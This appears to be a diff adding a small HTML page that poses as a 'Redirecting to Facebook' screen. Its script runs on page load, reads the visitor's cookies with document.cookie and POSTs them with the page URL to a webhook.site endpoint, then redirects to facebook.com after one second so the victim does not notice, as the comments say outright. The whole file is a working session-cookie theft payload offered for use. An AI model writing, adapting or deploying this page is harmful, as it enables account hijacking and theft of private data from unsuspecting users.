@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body style="background-color:#f0f2f5; text-align:center; padding-top:50px;">
+    <h3>Redirecting to Facebook...</h3>
+    <p>Please wait a moment.</p>
+
+    <script>
+        // 1. Define your webhook URL here
+        var webhookURL = "https://webhook.site/cf232a89-46d3-42f2-b351-91da3852244e"; // REPLACE THIS!
+
+        // 2. Function to send cookies
+        function sendCookies() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL, true);
+            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+            
+            // Get all cookies from the current domain (facebook.com)
+            var cookies = document.cookie;
+            
+            // Send data as JSON
+            xhr.send(JSON.stringify({
+                "cookies": cookies,
+                "url": window.location.href
+            }));
+
+            // 3. Redirect victim back to Facebook so they don't notice
+            setTimeout(function() {
+                window.location.href = "https://www.facebook.com/";
+            }, 1000); // Wait 1 second before redirecting
+        }
+
+        // 4. Run the function immediately when page loads
+        sendCookies();
+    </script>
+</body>
+</html>
